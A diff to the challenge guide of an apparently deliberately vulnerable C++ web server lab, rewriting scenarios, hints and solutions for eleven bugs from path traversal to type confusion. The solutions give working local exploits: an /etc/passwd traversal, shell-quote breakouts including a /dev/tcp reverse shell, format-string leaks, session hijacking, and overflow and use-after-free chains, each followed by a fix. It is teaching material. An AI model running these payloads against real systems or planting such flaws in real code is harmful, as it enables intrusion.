@@ -17,7 +17,7 @@ you're stuck.
 | 05  | [Predictable Session ID](#challenge-05)      | Crypto/Web | CWE-330 | medium     | [05](#solution-05) |
 | 06  | [Insecure Temp File (race)](#challenge-06)   | System     | CWE-377 | hard       | [06](#solution-06) |
 | 07  | [Username Info Leak](#challenge-07)          | Memory     | CWE-125 | medium     | [07](#solution-07) |
-| 08  | [Use-After-Free (logger)](#challenge-08)     | Memory     | CWE-416 | hard       | [08](#solution-08) |
+| 08  | [Use-After-Free (LogSink)](#challenge-08)    | Memory     | CWE-416 | hard       | [08](#solution-08) |
 | 09  | [Heap Buffer Overflow](#challenge-09)        | Memory     | CWE-122 | medium     | [09](#solution-09) |
 | 10  | [Integer Overflow](#challenge-10)            | Memory     | CWE-190 | medium     | [10](#solution-10) |
 | 11  | [Type Confusion](#challenge-11)              | Memory     | CWE-843 | hard       | [11](#solution-11) |
@@ -32,9 +32,13 @@ you're stuck.
 
 ### Scenario
 
-The static file handler joins the server document root with the request
-path using nothing more than `strcat`. There is no canonicalization and
-no rejection of `..` segments.
+The static handler used to join the document root and the request path
+with a bare `strcat`. That was later "fixed": the joined path is now
+canonicalized (resolving `..` segments and symlinks) behind a
+document-root containment guard. The order is wrong. The guard inspects
+the *lexical* joined path — which begins with the docroot by
+construction, so it can never fire — while the canonicalized result,
+the string actually handed to the filesystem, is never re-checked.
 
 ### Endpoint
 
@@ -42,13 +46,15 @@ Any URL served by the static handler, e.g. `GET /index.html`.
 
 ### Sink
 
-`handlers/static_files.cpp` — `strcat(file_path, req.clean_path);`
+`handlers/static_files.cpp` — the containment check on `joined`
+followed by `weakly_canonical(joined)`.
 
 ### Hints
 
-1. What does the server do with `/`-prefixed paths on disk?
-2. Standard clients normalize `..` before sending. What tools *don't*?
-3. Can you send a raw HTTP request with a literal `..` in the path?
+1. Read the guard closely: which string is it inspecting, and who built
+   that string?
+2. What does `weakly_canonical()` do to `..` segments?
+3. If a check always passes, what is it actually checking?
 
 ### Expected primitive
 
@@ -62,7 +68,9 @@ Arbitrary file read within the process's uid.
 
 ### Solution — 01 · Path Traversal
 
-**Code**: `handlers/static_files.cpp` → `strcat(file_path, req.clean_path);`
+**Code**: `handlers/static_files.cpp` → guard checks `joined`
+(docroot + path, tautologically docroot-prefixed), then serves
+`weakly_canonical(joined)` unchecked.
 
 Access files outside the web root:
 
@@ -71,6 +79,13 @@ curl --path-as-is "http://127.0.0.1:8081/../../../../../../../etc/passwd"
 ```
 
 `--path-as-is` is required because curl normalizes `..` by default.
+The `..` segments survive the guard (it never inspects them after
+resolution) and are collapsed by canonicalization into a path far
+outside the docroot.
+
+**The fix**: canonicalize first, then check containment — compare the
+*canonicalized* result against the canonicalized docroot, and reject
+anything that does not stay under it.
 
 ---
 
@@ -80,22 +95,30 @@ curl --path-as-is "http://127.0.0.1:8081/../../../../../../../etc/passwd"
 
 ### Scenario
 
-The unauthenticated log viewer takes a `filter` query parameter, URL-decodes
-it, and interpolates it directly into a shell command passed to `popen()`.
+The log viewer is a deliberate, believable ops feature: a default `tail`
+view, a server-side whitelisted `level` filter, and a free-text
+`search` parameter. The developer knew raw interpolation was dangerous,
+so the search term is URL-decoded and passed through `shell_escape()`
+before being placed in a `grep` pipeline. `shell_escape()` wraps its
+argument in double quotes. Quoting is not escaping: an embedded double
+quote terminates the argument early, and `$` / backticks are
+substituted *inside* double quotes.
 
 ### Endpoint
 
-`GET /logs?filter=<user input>`
+`GET /logs` · `GET /logs?level=error|warning|info` · `GET /logs?search=<free text>`
 
 ### Sink
 
-`request_logger.cpp` — `popen("sh -c \"grep " + decoded_filter + " ...")`
+`request_logger.cpp` — `command += " | grep -i " + shell_escape(url_decode(search));`
 
 ### Hints
 
-1. What character terminates a shell command?
-2. The filter is URL-decoded before being placed in the shell string.
-3. You do not need authentication for this route.
+1. The `level` parameter is whitelisted. Why does `search` still reach
+   the shell?
+2. What does double-quoting actually protect against? What character
+   terminates a double-quoted string?
+3. What happens to `$(...)` inside double quotes?
 
 ### Expected primitive
 
@@ -109,15 +132,28 @@ Arbitrary OS command execution as the server user.
 
 ### Solution — 02 · Command Injection
 
-**Code**: `request_logger.cpp` → `popen("sh -c \"grep " + decoded_filter + " ...")`
+**Code**: `request_logger.cpp` → `shell_escape()` = `return "\"" + s + "\"";`
+
+Break out of the quotes and run a command of your own:
 
 ```bash
-# Inject 'ls'
-curl "http://127.0.0.1:8081/logs?filter=%3B%20ls"
+# search = "; id " -> escaped as ""; id "" -> id runs in the pipeline
+curl "http://127.0.0.1:8081/logs?search=%22%3B%20id%20%22"
 
-# Reverse shell (listener on 4444)
-curl "http://127.0.0.1:8081/logs?filter=%3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F4444%200%3E%261"
+# Command substitution executes even *inside* double quotes
+curl "http://127.0.0.1:8081/logs?search=%24%28whoami%29"
 ```
+
+Reverse shell (listener on 4444), same breakout:
+
+```bash
+curl "http://127.0.0.1:8081/logs?search=%22%3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F4444%200%3E%261%20%22"
+```
+
+**The lesson**: shell escaping is a parser problem — every fix that
+keeps building a shell *string* chases the next metacharacter. The
+correct design never invokes a shell: `execve()`/`posix_spawn()` the
+`grep` binary directly with an argv array.
 
 ---
 
@@ -127,24 +163,30 @@ curl "http://127.0.0.1:8081/logs?filter=%3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%
 
 ### Scenario
 
-The request logger writes query parameter values to disk using
-`fprintf(log_file, value.c_str())` — value is used as the format string
-itself, giving an attacker `%p` / `%n` primitives against the logger's
-stack frame.
+The access logger writes query parameter values through the
+format-safe `"%s"` form. But it also records a per-request "custom
+field" — the client-supplied `X-Forwarded-For` address, a common
+request-tracing habit behind proxies — through a helper that passes
+the field to `fprintf()` as the *format string* itself. The missing
+`"%s"` indirection is an implementation mistake inside an ordinary
+logging pipeline, not a sink placed in the request path for
+exploitation.
 
 ### Endpoint
 
-Any request with a query string.
+Any request carrying an `X-Forwarded-For` header.
 
 ### Sink
 
-`request_logger.cpp` — `fprintf(log_file, value.c_str());`
+`request_logger.cpp` → `write_custom_field()` →
+`fprintf(log_file, field.c_str());`
 
 ### Hints
 
-1. Where does the value end up?
-2. Which `printf` conversion specifier reads a stack slot?
-3. `%n` isn't the only interesting one; leakage matters too.
+1. Query parameter values now land in the log literally. Which *other*
+   request-controlled string gets logged?
+2. Which header would a logging pipeline behind a proxy trust?
+3. `%p` leaks stack slots; `%n` writes (glibc-dependent).
 
 ### Expected primitive
 
@@ -158,16 +200,17 @@ Memory disclosure via `%p`; write primitive via `%n` (glibc-dependent).
 
 ### Solution — 03 · Uncontrolled Format String
 
-**Code**: `request_logger.cpp` → `fprintf(log_file, value.c_str());`
+**Code**: `request_logger.cpp` → `fprintf(log_file, field.c_str());`
 
-Leak stack values by making the parameter *value* contain format specifiers:
+Leak stack values via the forwarding header:
 
 ```bash
-curl "http://127.0.0.1:8081/?param=%p.%p.%p.%p.%p"
+curl -H "X-Forwarded-For: %p.%p.%p.%p.%p" http://127.0.0.1:8081/
 ```
 
-Inspect `/tmp/server.log` to see the leaked pointers. On glibc-based
-Linux, replacing `%p` with `%n` gives a write primitive.
+Inspect `/tmp/server.log` for the `X-Forwarded-For:` line to see the
+expanded pointers. On glibc-based Linux, replacing `%p` with `%n`
+gives a write primitive.
 
 ---
 
@@ -177,27 +220,35 @@ Linux, replacing `%p` with `%n` gives a write primitive.
 
 ### Scenario
 
-The router only issues a `Set-Cookie` when the client didn't send one.
-An attacker who chooses a session ID and tricks a victim into sending it
-can then reuse the same ID after the victim authenticates.
+Sessions have an explicit lifecycle: an anonymous session
+(client-chosen or server-minted) → its owner logs in → *the same
+Session object* is upgraded in place to `authenticated:admin`. The
+identifier is never rotated across that privilege transition, and the
+router admits an authenticated session with no credentials at all. An
+attacker who plants or learns the pre-auth ID therefore inherits the
+authenticated session.
 
 ### Endpoint
 
-Any endpoint, but the auth flow is on `/admin/*`.
+`/admin/*` with `Cookie: session_id=...`.
 
 ### Sink
 
-`router.cpp` — the `set_cookie_header` branch that skips rotation when
-`session_id` is already present in the request.
+`router.cpp` — `set_session_data(session_id, "authenticated:admin")`
+(no rotation) plus the session-admission branch that grants `/admin/*`
+on session state alone.
 
 ### Hints
 
-1. What does a real login flow do to the session ID after authentication?
-2. Send `Cookie: session_id=EVIL` and watch the response headers.
+1. What does a real login flow do to the session ID when privileges
+   change?
+2. Seed a cookie, authenticate with it, then replay the cookie *alone*.
+3. Watch the login response for a `Set-Cookie` that never comes.
 
 ### Expected primitive
 
-Account takeover after victim login (given the ability to plant a cookie).
+Account takeover after victim login (given the ability to plant a
+cookie).
 
 ### Regression test
 
@@ -207,22 +258,29 @@ Account takeover after victim login (given the ability to plant a cookie).
 
 ### Solution — 04 · Session Fixation
 
-**Code**: `router.cpp` → cookie is only rotated when the request had none.
+**Code**: `router.cpp` → the anonymous session is upgraded in place on
+login; authenticated sessions are admitted without credentials.
 
 1. Attacker seeds the session:
    ```bash
    curl -H "Cookie: session_id=EVIL_SESSION" http://127.0.0.1:8081/
    ```
-2. Victim authenticates (still using the same cookie):
+2. Victim authenticates (still using the same cookie — note the login
+   response carries **no** `Set-Cookie`, the ID was not rotated):
    ```bash
    curl -H "Cookie: session_id=EVIL_SESSION" \
         -H "Authorization: Basic YWRtaW46YWRtaW4=" \
         http://127.0.0.1:8081/admin/
    ```
-3. Attacker replays:
+3. Attacker replays — no credentials needed, the same session object
+   is now authenticated:
    ```bash
    curl -H "Cookie: session_id=EVIL_SESSION" http://127.0.0.1:8081/admin/
    ```
+
+**The fix**: rotate on privilege change — mint a fresh ID at login,
+invalidate the pre-auth one, and reject client-chosen identifiers that
+were never issued by the server.
 
 ---
 
@@ -232,23 +290,28 @@ Account takeover after victim login (given the ability to plant a cookie).
 
 ### Scenario
 
-`generate_session_id()` calls `srand(time(0))` and returns
-`"SESSION_" + std::to_string(rand())`. Because the seed is a low-entropy
-wall-clock value, an attacker who knows (or can guess) the second in
-which a session was minted can brute-force the ID space in trivial time.
+`generate_session_id()` was "hardened" beyond the old
+`srand(time(0)) + rand()` scheme: the PRNG output is now XOR-mixed
+with the process ID before being rendered as
+`SESSION_<8 hex digits>`. Every ingredient remains predictable: the
+seed is a one-second-resolution wall clock, and the PID is a small,
+externally observable integer. Two sessions minted in the same second
+are even *identical*.
 
 ### Endpoint
 
-Any endpoint whose response contains `Set-Cookie: session_id=SESSION_<n>`.
+Any endpoint whose response contains `Set-Cookie: session_id=SESSION_<hex8>`.
 
 ### Sink
 
-`session_manager.cpp` — `srand(time(0)); ... "SESSION_" + std::to_string(rand())`
+`session_manager.cpp` — `srand(time(0)); ... snprintf(..., "SESSION_%08x", a ^ b);`
 
 ### Hints
 
-1. What entropy source is the ID derived from?
-2. How many possible values are there for a given second?
+1. What are the two ingredients, and how much entropy does each really
+   contribute?
+2. Request two sessions back-to-back and compare the IDs.
+3. Where can an attacker observe a process ID?
 
 ### Expected primitive
 
@@ -262,24 +325,27 @@ Session-ID prediction leading to hijack of a victim's authenticated session.
 
 ### Solution — 05 · Predictable Session ID
 
-**Code**: `session_manager.cpp` → `srand(time(0)); ... rand()`.
+**Code**: `session_manager.cpp` → `srand(time(0)); rand() ^ getpid()`.
 
-Given a target session was minted at `T` (a unix epoch second), an
-attacker recreates the same PRNG state:
+Quick observable: two mints within the same second produce the *same*
+ID (same seed, same PID).
+
+Given a target session minted at `T` (a unix epoch second) and the
+server's PID, an attacker recreates the exact value:
 
 ```c
 srand(T);
-uint32_t predicted = rand();
-printf("SESSION_%u\n", predicted);
+uint32_t a = rand();
+uint32_t b = getpid_of_server();
+printf("SESSION_%08x\n", a ^ b);
 ```
 
-Then hijacks with:
+Brute a small window around `time(0)` (±3 seconds) and, if needed, a
+small PID range. Then hijack:
 
 ```bash
 curl -H "Cookie: session_id=SESSION_<predicted>" http://127.0.0.1:8081/admin/
 ```
-
-Try a small window around `time(0)` (e.g. ±3 seconds) to cover clock skew.
 
 ---
 
@@ -338,14 +404,17 @@ while :; do curl -s http://127.0.0.1:8081/echo.php; done
 
 <a id="challenge-07"></a>
 
-## 07 · Username Object Info Leak (CWE-125)
+## 07 · Username Info Leak (CWE-125)
 
 ### Scenario
 
-`handle_authentication()` casts a `std::string`'s `c_str()` result and
-then `send()`s **64 bytes** starting from there. For short-string
-optimized (SSO) strings this leaks adjacent bytes of the `std::string`
-object; for long strings it leaks bytes past the heap allocation.
+`/whoami` answers with a fixed 128-byte identity record so downstream
+tooling can parse it without a length-prefixed protocol. `snprintf()`
+formats `username=%s\n` into the record; the response then transmits
+the **entire buffer**. Only the formatted bytes (plus a NUL) were ever
+initialized — everything after the NUL is stale stack memory from this
+worker thread's previous request handling: pointers, request remnants,
+session state.
 
 ### Endpoint
 
@@ -353,16 +422,22 @@ object; for long strings it leaks bytes past the heap allocation.
 
 ### Sink
 
-`authentication.cpp` — `send(client_socket, leaked_ptr, 64, 0);`
+`handlers/admin.cpp` — whoami():
+`send_status(..., std::string(response, sizeof(response)), ...)`
 
 ### Hints
 
-1. Try both short and long usernames.
-2. What lives immediately after a `std::string`'s SSO buffer?
+1. Compare the Content-Length (always 128) with the length of the
+   formatted `username=...` prefix.
+2. Which earlier activity on this worker thread wrote the bytes you
+   are now reading?
+3. Fire a request with long headers first, then `/whoami` — the
+   leaked tail changes.
 
 ### Expected primitive
 
-Out-of-bounds read → memory disclosure.
+Uninitialized read → disclosure of stale stack contents (pointers →
+ASLR defeats for the memory-corruption challenges).
 
 ### Regression test
 
@@ -372,83 +447,123 @@ Out-of-bounds read → memory disclosure.
 
 ### Solution — 07 · Username Info Leak
 
-**Code**: `authentication.cpp` → `send(client_socket, leaked_ptr, 64, 0);`
+**Code**: `handlers/admin.cpp` → the 128-byte record is transmitted in
+full regardless of the formatted length.
 
 ```bash
-curl -u admin:admin http://127.0.0.1:8081/whoami | xxd | head
+curl -s -u admin:admin http://127.0.0.1:8081/whoami | xxd
 ```
 
-The response starts with `Leaked internal username object bytes:` followed
-by 64 raw bytes read from the `std::string` internal buffer. Try with
-longer usernames (>SSO threshold) to leak past the heap allocation.
+The body starts with `username=admin\n`, then a NUL, then ~113 bytes
+of stack garbage. Seed the stack first with a request carrying long
+interesting headers, then connect again — pointers into heap, stack
+and libraries leak and break ASLR for challenges 08–12.
+
+**The fix**: transmit only what was formatted —
+`std::string(response, strlen(response))` — or build the record in a
+`std::string` so the buffer length *is* the data length.
 
 ---
 
 <a id="challenge-08"></a>
 
-## 08 · Use-After-Free (Logger Config, CWE-416)
+## 08 · Use-After-Free — Logging Sinks (CWE-416)
 
 ### Scenario
 
-`action=reset` frees the `current_log_format` struct but does not null
-the pointer. The next request that goes through the logger derefs the
-dangling pointer and, if the heap has been groomed, calls an
-attacker-controlled function pointer at `log_func`.
+The access log can be redirected at runtime:
+`/admin/logging?output=file|syslog` swaps the installed `LogSink` — a
+C++ object with a *virtual* `write()`. Request threads don't log
+synchronously; they enqueue `{record, LogSink*}` entries for a
+background worker that batches records for at least 250 ms before
+flushing. The captured sink pointer travels with the record. Swapping
+the output **deletes the outgoing sink immediately**; queued records
+keep the stale pointer, and the worker's later `sink->write()` is a
+virtual call dispatching through a vtable pointer read from freed
+memory.
 
 ### Endpoint
 
-`GET /admin/logger_config?action=set&format=...`
-`GET /admin/logger_config?action=reset`
+`GET /admin/logging?output=file`
+`GET /admin/logging?output=syslog`
 
 ### Sink
 
-`request_logger.cpp` — `free(current_log_format);` without setting to `nullptr`.
+`logging_sink.cpp` — `install_log_sink()` deletes the old sink;
+`worker_loop()` calls `entry.sink->write(entry.record)` on records
+queued before the swap.
 
 ### Hints
 
-1. `LogFormat` is 64 bytes of char + 8 bytes of function pointer.
-2. What other route lets you allocate 72 bytes with attacker-controlled contents?
-3. `/admin/system_status` (challenge 09) is your friend here.
+1. A record remembers the sink that was installed when it was
+   captured. Who owns that pointer now?
+2. The worker flushes no earlier than 250 ms after capture — that is
+   your window between the delete and the use.
+3. A virtual call must first read a vtable pointer from the object.
+   What can reclaim that memory — and which challenge lets you size
+   allocations freely?
 
 ### Expected primitive
 
-Controlled call of an arbitrary function pointer.
+Virtual call through a dangling vtable pointer → RIP control once the
+freed chunk is reclaimed with a fake vtable pointer (heap grooming via
+challenge 09).
 
 ### Regression test
 
-`tests/exploit/test_uaf_logger.py` (needs `--asan` for a hard signal)
+`tests/exploit/test_uaf_logger.py` (hard crash under `--asan`)
 
 <a id="solution-08"></a>
 
-### Solution — 08 · Use-After-Free (Logger)
+### Solution — 08 · Use-After-Free (Logging Sinks)
 
-**Code**: `request_logger.cpp` → `free(current_log_format);` without nulling.
+**Code**: `logging_sink.cpp` → `install_log_sink()`: `delete old;`
+while queue entries still hold `old`; `worker_loop()`:
+`entry.sink->write(entry.record)`.
 
 ```bash
-# 1. Allocate the 72-byte LogFormat.
-curl -u admin:admin "http://127.0.0.1:8081/admin/logger_config?action=set&format=AAAA"
+# 1. Install the file sink.
+curl -u admin:admin "http://127.0.0.1:8081/admin/logging?output=file"
 
-# 2. Free without nulling the dangling pointer.
-curl -u admin:admin "http://127.0.0.1:8081/admin/logger_config?action=reset"
+# 2. Generate a log record that captures the FileLogSink pointer.
+#    (Records wait >= 250 ms in the queue before the worker flushes.)
+curl "http://127.0.0.1:8081/index.html"
 
-# 3. Groom the heap so the freed chunk is reallocated with attacker data.
-#    (challenge 09's system_status is a convenient 32-byte primitive;
-#     iterate a few times to hit the 72-byte size class.)
+# 3. Swap the sink: the FileLogSink is deleted while the record is
+#    still queued.
+curl -u admin:admin "http://127.0.0.1:8081/admin/logging?output=syslog"
 
-# 4. Trigger the logger on any subsequent request.
-curl "http://127.0.0.1:8081/"
+# 4. The worker flushes the stale record and dispatches virtually
+#    through freed memory. Under ASan this aborts with
+#    heap-use-after-free; on a plain build it crashes as soon as the
+#    chunk has been reclaimed by other allocations.
 ```
+
+For control-flow hijack: between steps 3 and 4 (the ≥ 250 ms window),
+groom the freed chunk with challenge 09 so its first 8 bytes — the
+vtable slot — point at a fake vtable whose `write()` entry is your
+target function.
+
+**The fix**: shared ownership — capture a `std::shared_ptr<LogSink>`
+in each queue entry, or drain and synchronize the queue before
+deleting a sink.
 
 ---
 
 <a id="challenge-09"></a>
 
-## 09 · Heap Buffer Overflow (CWE-122)
+## 09 · Heap Buffer Overflow — Decode Sizing (CWE-122)
 
 ### Scenario
 
-`system_status` allocates a fixed 32-byte heap buffer and copies bytes
-from the `status=` parameter until it sees a NUL, `\n`, or `\r`.
+`system_status` sizes its decode buffer with a shared helper, then
+decodes into it. `estimate_decoded_length()` (utils.cpp) assumes every
+`%` begins a valid three-character `%XX` escape and counts **one**
+output byte per escape. The decoder in handlers/admin.cpp leaves
+malformed escapes **verbatim**: `%GZ` is not a valid escape, so all
+three characters are copied. Two implementations of the same encoding
+rule drifted apart — input laced with malformed escapes decodes to up
+to 3× the estimated size and the copy runs off the allocation.
 
 ### Endpoint
 
@@ -456,35 +571,52 @@ from the `status=` parameter until it sees a NUL, `\n`, or `\r`.
 
 ### Sink
 
-`handlers/admin.cpp` — `char* status_msg = (char*)malloc(32);` then unbounded copy.
+`handlers/admin.cpp` —
+`malloc(estimate_decoded_length(status_pos) + 1)` followed by
+`decode_status_param(status_pos, status_msg)`.
 
 ### Hints
 
-1. What are you overwriting once you go past 32 bytes?
-2. Consider chunk metadata *or* the next allocation.
-3. Combine with challenge 08 to line up the primitives.
+1. Well-formed input (`%41`) sizes perfectly. What does `%GZ` cost in
+   the estimator versus the decoder?
+2. You control both the decoded *contents* and the allocation *size* —
+   that is a heap-grooming primitive, not just a smash.
+3. Combine with challenge 08: a freed sink chunk is a target your
+   sizing can land in.
 
 ### Expected primitive
 
-Adjacent heap corruption; controlled function-pointer overwrite when
-chained with the UAF.
+Adjacent heap corruption with fully controlled contents and size
+class; fake-vtable construction for the UAF chain.
 
 ### Regression test
 
-`tests/exploit/test_heap_overflow.py` (build with `--asan` for a clear crash)
+`tests/exploit/test_heap_overflow.py` (build with `--asan` for a clear
+crash)
 
 <a id="solution-09"></a>
 
-### Solution — 09 · Heap Buffer Overflow
+### Solution — 09 · Heap Buffer Overflow (Decode Sizing)
 
-**Code**: `handlers/admin.cpp` → 32-byte `malloc`, unbounded copy from `status=`.
+**Code**: `estimate_decoded_length()` counts `%GZ` as one byte;
+`decode_status_param()` writes three.
 
 ```bash
 curl -u admin:admin -X POST "http://127.0.0.1:8081/admin/system_status" \
-    -d "status=$(python3 -c 'print("A"*200)')"
+    -d "status=$(python3 -c 'print("%GZ"*200)')"
 ```
 
-Rebuild with `cmake -DENABLE_ASAN=ON` to see the exact overflow site.
+200 malformed escapes → estimate 200 → `malloc(201)` → the decoder
+writes 600 bytes. Valid escapes (`%XX`) decode one byte each and stay
+within the estimate, so the bug only fires on the malformed case. The
+decoder *does* honor `%XX`, so the overflowing bytes themselves are
+arbitrary: encode the payload with valid escapes while sizing the
+allocation with malformed ones.
+
+**The fix**: one implementation of the sizing rule — have the decoder
+return the number of bytes written, or decode through a bounded writer
+that grows on demand. Never keep two hand-rolled copies of the same
+encoding rule.
 
 ---
 
@@ -494,10 +626,13 @@ Rebuild with `cmake -DENABLE_ASAN=ON` to see the exact overflow site.
 
 ### Scenario
 
-`upload_file` computes `buffer_size = content_len + 64` as an unsigned
-32-bit int. Setting `Content-Length` close to `UINT_MAX` wraps the
-result to a tiny number; the subsequent `recv()` writes the full,
-attacker-declared body length into the undersized allocation.
+`upload_file` stores uploads as a fixed 64-byte `UploadHeader`
+followed by the body. The allocation sums three individually harmless
+fields in 32-bit arithmetic — `sizeof(UploadHeader)`, the declared
+`Content-Length`, and the declared `X-Filename-Length`. Lengths near
+`UINT_MAX` wrap the total to a tiny allocation, while the copy below
+uses the **original** `Content-Length` for both its offset and its
+length.
 
 ### Endpoint
 
@@ -505,12 +640,17 @@ attacker-declared body length into the undersized allocation.
 
 ### Sink
 
-`handlers/admin.cpp` — `unsigned int buffer_size = content_len + 64;`
+`handlers/admin.cpp` —
+`(uint32_t)sizeof(UploadHeader) + content_len + filename_len`
 
 ### Hints
 
-1. What is `UINT_MAX + 64`?
-2. `recv()`'s length is `content_len`, not `buffer_size`.
+1. Three fields, each reasonable on its own. What is their sum
+   mod 2³²?
+2. `recv()`'s destination offset *and* length still use the original
+   values.
+3. ASan validates the recv buffer up front — the declared body does
+   not even have to arrive.
 
 ### Expected primitive
 
@@ -524,7 +664,8 @@ Massive controlled heap overflow.
 
 ### Solution — 10 · Integer Overflow
 
-**Code**: `handlers/admin.cpp` → `unsigned int buffer_size = content_len + 64;`
+**Code**: `handlers/admin.cpp` → the 32-bit sum of header + body +
+filename lengths.
 
 ```python
 import socket
@@ -535,47 +676,65 @@ payload = (
     b"POST /admin/upload_file HTTP/1.1\r\n"
     b"Host: 127.0.0.1\r\n"
     b"Authorization: Basic YWRtaW46YWRtaW4=\r\n"
-    b"Content-Length: 4294967232\r\n\r\n"  # UINT_MAX - 63
-    + b"A" * 1000
+    b"Content-Length: 4294967168\r\n"   # 2^32 - 128
+    b"X-Filename-Length: 64\r\n\r\n"    # 64 + body + 64 = 2^32 -> 0
+    + b"A" * 200
 )
 s.send(payload)
 s.close()
 ```
 
-Under ASan the server aborts with a heap-buffer-overflow trace.
+`allocation` wraps to 0 → `malloc(0)`; the 64-byte header
+initialization and `recv(file_buffer + 64, 4294967168, 0)` then write
+far past the chunk. Under ASan the server aborts with a
+heap-buffer-overflow trace.
+
+**The fix**: checked arithmetic (`__builtin_add_overflow`) on every
+summed field, and a sanity cap on declared lengths before any
+allocation is made.
 
 ---
 
 <a id="challenge-11"></a>
 
-## 11 · Type Confusion (CWE-843)
+## 11 · Type Confusion — Route Metadata (CWE-843)
 
 ### Scenario
 
-`AliasRule` and `ExecRule` inherit from a common `Rule` base. The CGI
-dispatcher blindly `static_cast`s any `Rule*` whose path starts with
-`/cgi-bin/` to `ExecRule*`. Because `AliasRule::target` (a 64-byte char
-array) lives at the same offset as `ExecRule::callback` (a function
-pointer), attacker-controlled bytes in `target` become the callee.
+Routes form a normal C++ hierarchy: `StaticRoute` (serves a directory)
+and `CgiRoute` (runs an executable), both deriving from `Route`.
+Separately, the router keeps a metadata map `path → RouteType` that
+mirrors each object's class for dispatch decisions. `/admin/update_rule`
+rewrites the metadata entry — but never reconstructs the object it
+describes. A `StaticRoute` tagged `CGI` now reaches dispatch, where
+`static_cast<CgiRoute*>(rule)->execute()` reads the StaticRoute's
+`directory` string (the same member offset as `CgiRoute::executable`)
+and runs it as a command.
 
 ### Endpoint
 
-1. `GET /admin/add_rule?type=alias&path=/cgi-bin/pwn&target=<8 bytes>` (Basic auth)
-2. `GET /cgi-bin/pwn`
+1. `GET /admin/add_rule?type=static&path=/cgi-bin/pwn&directory=<command>` (Basic auth)
+2. `GET /admin/update_rule?path=/cgi-bin/pwn&type=cgi` (Basic auth)
+3. `GET /cgi-bin/pwn` (no auth)
 
 ### Sink
 
-`handlers/cgi.cpp` — `ExecRule* exec = static_cast<ExecRule*>(rule);`
+`handlers/cgi.cpp` —
+`if (route_types()[rule->path] == RouteType::CGI) static_cast<CgiRoute*>(rule)->execute(...)`
 
 ### Hints
 
-1. What are the first 8 bytes of `target` doing at that memory offset?
-2. Try `target=AAAAAAAA` first and observe the crash address.
-3. Where would you point a real exploit?
+1. Two sources of truth describe one object's type. Which one does
+   dispatch trust?
+2. Where does `directory` sit inside a `StaticRoute`, and where does
+   `execute()` look for `executable`?
+3. The trigger needs no credentials. How do you reach the admin
+   endpoints without the password? (Challenges 04 / 05.)
 
 ### Expected primitive
 
-Controlled call of an arbitrary 8-byte function pointer → RIP control.
+Arbitrary command execution as the server user via the unauthenticated
+`/cgi-bin/*` dispatch.
 
 ### Regression test
 
@@ -583,20 +742,33 @@ Controlled call of an arbitrary 8-byte function pointer → RIP control.
 
 <a id="solution-11"></a>
 
-### Solution — 11 · Type Confusion
+### Solution — 11 · Type Confusion (Route Metadata)
 
-**Code**: `handlers/cgi.cpp` → `ExecRule* exec = static_cast<ExecRule*>(rule);`
+**Code**: `handlers/admin.cpp` → `update_rule()` rewrites
+`route_types()` only; `handlers/cgi.cpp` → blind `static_cast`.
 
 ```bash
-# Register an alias rule whose target's first 8 bytes are the address to jump to.
-curl -u admin:admin "http://127.0.0.1:8081/admin/add_rule?type=alias&path=/cgi-bin/pwn&target=AAAAAAAA"
+# 1. Register a static rule whose directory string is your command.
+curl -u admin:admin "http://127.0.0.1:8081/admin/add_rule?type=static&path=/cgi-bin/pwn&directory=id"
 
-# Trigger dispatch: server jumps to 0x4141414141414141.
-curl "http://127.0.0.1:8081/cgi-bin/pwn"
+# 2. Flip the metadata tag; the StaticRoute object is NOT reconstructed.
+curl -u admin:admin "http://127.0.0.1:8081/admin/update_rule?path=/cgi-bin/pwn&type=cgi"
+
+# 3. Trigger the confused dispatch: execute() runs `directory` as the
+#    CGI executable and streams the output back.
+curl "http://127.0.0.1:8081/cgi-bin/pwn"     # -> uid=...
 ```
 
-For real RCE, combine with a leaked libc/aslr base from challenge 03 or 07
-and set `target` to the address of `system()`.
+No memory is corrupted: both strings occupy the same member offset
+(ordinary single-inheritance layout), which is exactly why the cast
+"works" until it doesn't. Chain with challenge 04 (session fixation)
+or 05 (predictable session IDs) to reach the admin endpoints without
+the password, then flip any static rule into a CGI runner.
+
+**The fix**: one source of truth — make the type query virtual
+(`virtual RouteType type() const`) or store the tag inside the object;
+never allow an update path that changes one representation without the
+other.
 
 ---
 
